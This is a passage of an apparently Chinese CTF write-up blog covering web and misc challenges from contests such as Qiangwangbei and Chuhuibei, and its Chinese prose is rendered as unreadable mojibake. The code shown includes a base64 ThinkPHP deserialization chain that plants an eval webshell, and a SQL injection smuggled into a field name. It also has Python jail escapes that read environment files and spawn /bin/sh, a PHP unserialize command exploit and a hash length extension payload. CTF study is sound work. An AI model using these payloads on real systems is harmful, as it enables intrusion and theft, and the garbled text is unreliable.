&quot;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&quot;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;id&#x27;: &#x27;1&#x27;,</span><br><span class="line">    &#x27;name&#x27;: &#x27;1&#x27;,</span><br><span class="line">    &#x27;price&#x27;: &#x27;1.00&#x27;,</span><br><span class="line">    &#x27;on_sale_time&#x27;: &#x27;2023-12-16T21:20&#x27;,</span><br><span class="line">    &#x27;image&#x27;: &#x27;$sql&#x27;,</span><br><span class="line">    f&quot;data`=&#x27;&#123;exp&#125;&#x27;/**/WHERE/**/`id`/**/=/**/1;#&quot;: &#x27;123&#x27;,</span><br><span class="line">    &#x27;data&#x27;: &#x27;1&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, cookies=cookies, data=data)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>æœ€åè®¿é—®é¡µé¢ï¼Œè§¦å‘ååºåˆ—åŒ–</p>
<p><img src="/2023/12/27/qiangwangbei/image-20231218235942528-1707064057755-9.png" alt="image-20231218235942528"></p>
<p>æœ¬åœ°æ‰“ä¸€ä¸‹ï¼Œçœ‹è§æ‰“ä¸Šå»äº†</p>
<p>ç›´æ¥RCE</p>
<p><img src="/2023/12/27/qiangwangbei/image-20231219000032765-1707064057755-10.png" alt="image-20231219000032765"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Pyjail-Itâ€™s-myFILTER"><a href="#Pyjail-Itâ€™s-myFILTER" class="headerlink" title="Pyjail ! Itâ€™s myFILTER !!!"></a>Pyjail ! Itâ€™s myFILTER !!!</h3><p>æºç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># Python Version:python3.10</span><br><span class="line"># Source Code:</span><br><span class="line"></span><br><span class="line">import code, os, subprocess</span><br><span class="line">import pty</span><br><span class="line">def blacklist_fun_callback(*args):</span><br><span class="line">    print(&quot;Player! It&#x27;s already banned!&quot;)</span><br><span class="line"></span><br><span class="line">pty.spawn = blacklist_fun_callback</span><br><span class="line">os.system = blacklist_fun_callback</span><br><span class="line">os.popen = blacklist_fun_callback</span><br><span class="line">subprocess.Popen = blacklist_fun_callback</span><br><span class="line">subprocess.call = blacklist_fun_callback</span><br><span class="line">code.interact = blacklist_fun_callback</span><br><span class="line">code.compile_command = blacklist_fun_callback</span><br><span class="line"></span><br><span class="line">vars = blacklist_fun_callback</span><br><span class="line">attr = blacklist_fun_callback</span><br><span class="line">dir = blacklist_fun_callback</span><br><span class="line">getattr = blacklist_fun_callback</span><br><span class="line">exec = blacklist_fun_callback</span><br><span class="line">__import__ = blacklist_fun_callback</span><br><span class="line">compile = blacklist_fun_callback</span><br><span class="line">breakpoint = blacklist_fun_callback</span><br><span class="line"></span><br><span class="line">del os, subprocess, code, pty, blacklist_fun_callback</span><br><span class="line">input_code = input(&quot;Can u input your code to escape &gt; &quot;)</span><br><span class="line"></span><br><span class="line">blacklist_words = [</span><br><span class="line">    &quot;subprocess&quot;,</span><br><span class="line">    &quot;os&quot;,</span><br><span class="line">    &quot;code&quot;,</span><br><span class="line">    &quot;interact&quot;,</span><br><span class="line">    &quot;pty&quot;,</span><br><span class="line">    &quot;pdb&quot;,</span><br><span class="line">    &quot;platform&quot;,</span><br><span class="line">    &quot;importlib&quot;,</span><br><span class="line">    &quot;timeit&quot;,</span><br><span class="line">    &quot;imp&quot;, </span><br><span class="line">    &quot;commands&quot;,</span><br><span class="line">    &quot;popen&quot;,</span><br><span class="line">    &quot;load_module&quot;,</span><br><span class="line">    &quot;spawn&quot;,</span><br><span class="line">    &quot;system&quot;,</span><br><span class="line">    &quot;/bin/sh&quot;,</span><br><span class="line">    &quot;/bin/bash&quot;,</span><br><span class="line">    &quot;flag&quot;,</span><br><span class="line">    &quot;eval&quot;,</span><br><span class="line">    &quot;exec&quot;,</span><br><span class="line">    &quot;compile&quot;,</span><br><span class="line">    &quot;input&quot;,</span><br><span class="line">    &quot;vars&quot;,</span><br><span class="line">    &quot;attr&quot;,</span><br><span class="line">    &quot;dir&quot;,</span><br><span class="line">    &quot;getattr&quot;</span><br><span class="line">    &quot;__import__&quot;,</span><br><span class="line">    &quot;__builtins__&quot;,</span><br><span class="line">    &quot;__getattribute__&quot;,</span><br><span class="line">    &quot;__class__&quot;,</span><br><span class="line">    &quot;__base__&quot;,</span><br><span class="line">    &quot;__subclasses__&quot;,</span><br><span class="line">    &quot;__getitem__&quot;,</span><br><span class="line">    &quot;__self__&quot;,</span><br><span class="line">    &quot;__globals__&quot;,</span><br><span class="line">    &quot;__init__&quot;,</span><br><span class="line">    &quot;__name__&quot;,</span><br><span class="line">    &quot;__dict__&quot;,</span><br><span class="line">    &quot;._module&quot;,</span><br><span class="line">    &quot;builtins&quot;,</span><br><span class="line">    &quot;breakpoint&quot;,</span><br><span class="line">    &quot;import&quot;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def my_filter(input_code):</span><br><span class="line">    for x in blacklist_words:</span><br><span class="line">        if x in input_code:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">while &#x27;&#123;&#x27; in input_code and &#x27;&#125;&#x27; in input_code and input_code.isascii() and my_filter(input_code) and &quot;eval&quot; not in input_code and len(input_code) &lt; 65:</span><br><span class="line">    input_code = eval(f&quot;f&#x27;&#123;input_code&#125;&#x27;&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;Player! Please obey the filter rules which I set!&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æ‰“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;&#125;&#x27; + print(open(&#x27;/proc/1/environ&#x27;).read()) #</span><br></pre></td></tr></table></figure>

<h3 id="Pyjail-Itâ€™s-myRevenge"><a href="#Pyjail-Itâ€™s-myRevenge" class="headerlink" title="Pyjail ! Itâ€™s myRevenge !!!"></a>Pyjail ! Itâ€™s myRevenge !!!</h3><p>é¢˜ç›®æºç </p>
<p>ç¬¬ä¸€æ­¥æ¸…é™¤ blacklistï¼Œç„¶åç”¨ input è¯»å…¥ç»§ç»­æ‰“</p>
<table>
<thead>
<tr>
<th><code>1 2 3 </code></th>
<th><code>&#123;[list(globals().values())[-2].clear(),&quot;&#123;i&quot;&quot;nput()&#125;&quot;][1]&#125; &#123;[globals()[&quot;__builtins__&quot;].exec(&quot;import os&quot;),&quot;&#123;i&quot;&quot;nput()&#125;&quot;][1]&#125; &#123;[os.spawnv(0, &quot;/bin/sh&quot;, [&quot;sh&quot;]),&quot;&#123;i&quot;&quot;nput()&#125;&quot;][1]&#125; </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="Pyjail-Itâ€™s-myAST"><a href="#Pyjail-Itâ€™s-myAST" class="headerlink" title="Pyjail ! Itâ€™s myAST !!!!"></a>Pyjail ! Itâ€™s myAST !!!!</h3><p>é¢˜ç›®æºç ï¼Œè¿œç¨‹ç¯å¢ƒä¸º python 3.11</p>
<p>python 3.10 å¼€å§‹å¼•å…¥äº† <code>match</code> å…³é”®å­—ï¼Œå¯ä»¥ç”¨ <code>match</code> è·å–å¯¹è±¡å±æ€§ï¼Œç”¨ unicode <code>ï¹</code> ç»•è¿‡ä¸‹åˆ’çº¿æ£€æµ‹ï¼Œç”¨ <code>bytes</code> è½¬å­—ç¬¦ä¸²å’Œ <code>len</code> æ„é€ æ•°å­—ç»•è¿‡ ast ä¸­çš„ç¦æ­¢å¸¸é‡ï¼Œä½¿ç”¨æµ·è±¡è¿ç®—ç¬¦ç»•è¿‡èµ‹å€¼ï¼Œå‡å° payload é•¿åº¦ï¼Œè™½ç„¶ 1800 å¤Ÿç”¨äº† ï¼ˆ</p>
<h3 id="ä¸€-SpeedUp"><a href="#ä¸€-SpeedUp" class="headerlink" title="ä¸€.SpeedUp"></a>ä¸€.SpeedUp</h3><p><img src="/image-20231219005108031-1707064057755-11.png" alt="image-20231219005108031">åœ¨è¿™ä¸ªç½‘ç«™ç›´æ¥è®°è½½äº†2çš„27æ¬¡æ–¹çš„é˜¶ä¹˜çš„æ¯ä¸€ä½æ•°å­—ä¹‹å’Œ</p>
<p>A244060 - OEIS</p>
<p><img src="/image-20231219005038815-1707064057755-12.png" alt="image-20231219005038815"></p>
<p>å¯¹4495662081å–ä¸ªsha256å³å¯ </p>
<p>flag{bbdee5c548fddfc76617c562952a3a3b03d423985c095521a8661d248fad3797}</p>
<h3 id="çŸ³å¤´å‰ªåˆ€å¸ƒ"><a href="#çŸ³å¤´å‰ªåˆ€å¸ƒ" class="headerlink" title="çŸ³å¤´å‰ªåˆ€å¸ƒ"></a>çŸ³å¤´å‰ªåˆ€å¸ƒ</h3><p>ä»–æ˜¯è´å¶æ–¯é¢„æµ‹ï¼Œç„¶åæ‰‹æ“åºåˆ—ï¼Œæ¯æ¬¡è´å¶æ–¯çš„é¢„æµ‹çš„åº”è¯¥å·®ä¸å¤šï¼Œå¯ä»¥çœ‹æœ€åä¸€æ¬¡ç»“æœï¼Œç„¶ååºåˆ—ä¸­æ”¹æˆèµ¢è¿‡AIçš„å‡ºæ³•åŠ å…¥åºåˆ—ï¼ŒæŒ‰ç…§è¿™ä¸ªè§„å¾‹æ”¹å°±å¯ä»¥æŠŠåˆ†æ•°é€æ­¥ä¸Šå‡ï¼Œæœ€åè¾¾åˆ°260åˆ†æ‹¿åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0 - çŸ³å¤´ï¼Œ1 - å‰ªåˆ€ï¼Œ2 - å¸ƒ</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.147.133.72&#x27;</span>,<span class="number">25458</span>)</span><br><span class="line"></span><br><span class="line">opponent_choice = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(opponent_choice)):</span><br><span class="line">    d = p.recv()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(opponent_choice[i]).encode())</span><br><span class="line">    r = p.recv()</span><br><span class="line">    score = re.findall(<span class="string">r&#x27;ä½ çš„åˆ†æ•°ï¼š (.*?)\n&#x27;</span>,d.decode())</span><br><span class="line">    <span class="keyword">if</span> score != []:</span><br><span class="line">        <span class="built_in">print</span>(score[<span class="number">0</span>]+<span class="string">&#x27;/260&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line">d = p.recv()</span><br><span class="line"><span class="built_in">print</span>(d.decode())</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r = p.recv()</span><br><span class="line"><span class="built_in">print</span>(r.decode())</span><br><span class="line">score = re.findall(<span class="string">r&#x27;ä½ çš„åˆ†æ•°ï¼š (.*?)\n&#x27;</span>,d.decode())</span><br><span class="line"><span class="keyword">if</span> score != []:</span><br><span class="line">    <span class="built_in">print</span>(score[<span class="number">0</span>]+<span class="string">&#x27;/260&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(opponent_choice))+<span class="string">&#x27;/100&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
	
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/12/25/chuhuibei/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="Record my study life">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="chleynx's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/25/chuhuibei/" class="post-title-link" itemprop="url">æ¥šæ…§æ¯</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-12-25 00:31:42" itemprop="dateCreated datePublished" datetime="2023-12-25T00:31:42+08:00">2023-12-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-02-05 00:34:08" itemprop="dateModified" datetime="2024-02-05T00:34:08+08:00">2024-02-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="æ¥šæ…§æ¯"><a href="#æ¥šæ…§æ¯" class="headerlink" title="æ¥šæ…§æ¯"></a>æ¥šæ…§æ¯</h1><h2 id="eaaeval"><a href="#eaaeval" class="headerlink" title="eaaeval"></a>eaaeval</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œæºç ç»™äº†ç”¨æˆ·å¯†ç </p>
<p><img src="/2023/12/25/chuhuibei/image-20231219005653278-1707064335125-1.png" alt="image-20231219005653278"></p>
<p>ç™»é™†åå•¥ä¹Ÿæ²¡æœ‰ï¼Œæ‰«ä¸€ä¸‹å‘ç°æºç æ³„éœ²<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &#x27;admin&#x27;;</span><br><span class="line">        $this-&gt;b = &#x27;admin&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if(!preg_match(&quot;/flag|system|php|cat|tac|shell|sort/i&quot;, $this-&gt;a) &amp;&amp; !preg_match(&quot;/flag|system|php|cat|tac|shell|sort/i&quot;, $this-&gt;b))&#123;</span><br><span class="line">    	system($this-&gt;a.&#x27; &#x27;.$this-&gt;b);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                echo &quot;again?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$wzbz = $_GET[&#x27;wzbz&#x27;];</span><br><span class="line">unserialize($wzbz);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>expå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$A=new Flag();</span><br><span class="line">$A-&gt;a=&#x27;ca\t&#x27;;</span><br><span class="line">$A-&gt;b=&#x27;/f*&#x27;;</span><br><span class="line">echo serialize($A);</span><br></pre></td></tr></table></figure>

<p>upload_shell<br>æ‰“å¼€é¢˜ç›®ï¼Œæœ‰ä¸ªç™»å½•æ¡†ï¼Œéšä¾¿ç™»å½•è¿›å»</p>
<p>å¾—åˆ°æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> &lt;?php</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;./my.php&quot;;</span><br><span class="line">echo strlen($secret);</span><br><span class="line">echo&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo(md5($secret.&quot;adminpassword&quot;));</span><br><span class="line">@$username = urldecode($_POST[&quot;username&quot;]);</span><br><span class="line">@$password = urldecode($_POST[&quot;password&quot;]);</span><br><span class="line">if (!empty($_COOKIE[&quot;source&quot;])) &#123;</span><br><span class="line">    if ($username === &quot;admin&quot; &amp;&amp; $password != &quot;password&quot;) &#123;</span><br><span class="line">         if ($_COOKIE[&quot;source&quot;] === md5($secret.$username.$password)) &#123;</span><br><span class="line"></span><br><span class="line">         // åœ¨éªŒè¯ç”¨æˆ·åï¼Œå¦‚æœç™»å½•æˆåŠŸï¼Œè®¾ç½®ä¼šè¯å˜é‡æ¥è¡¨ç¤ºç”¨æˆ·å·²ç™»å½•</span><br><span class="line">          $_SESSION[&#x27;loggedin&#x27;] = true;</span><br><span class="line">          $_SESSION[&#x27;username&#x27;] = &#x27;admin&#x27;; // ç”¨æˆ·å</span><br><span class="line">          $_SESSION[&#x27;role&#x27;] = &#x27;admin&#x27;; // ç”¨æˆ·è§’è‰²æˆ–æƒé™</span><br><span class="line">          echo &quot;&lt;script&gt;window.location.href=&#x27;upload.php&#x27;;&lt;/script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">             echo &quot;&lt;br&gt;&quot;; </span><br><span class="line">            die (&quot;ä½ çš„cookieå¥½åƒä¸å¤ªå¯¹å•Š&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die (&quot;å¯ä¸ä¼šè½»æ˜“æ”¾ä½ è¿›å»&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">14</span><br><span class="line">879bd10c8628894d388c068a25326c21</span><br></pre></td></tr></table></figure>


<p>åˆ†æä¸€ä¸‹å‘ç°æ˜¯å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»<br>ç›´æ¥è„šæœ¬</p>
<p>bpæŠ“åŒ…ä¿®æ”¹cookie</p>
<p>username&#x3D;admin&amp;password&#x3D;password%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%d8%00%00%00%00%00%00%00ctf<br>1<br>æˆåŠŸè·³è½¬</p>
<p>è¿™é‡Œè€ƒç‚¹æ˜¯æ–‡ä»¶ä¸Šä¼ æ³¨å…¥ï¼Œå¯¹æ–‡ä»¶åæ³¨å…¥</p>
<p>æ”¾å¼ƒçµé­‚ç›´æ¥sqlmapè·‘</p>

      
    </div>

    
    
    
	
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/12/25/ASISCTF/">

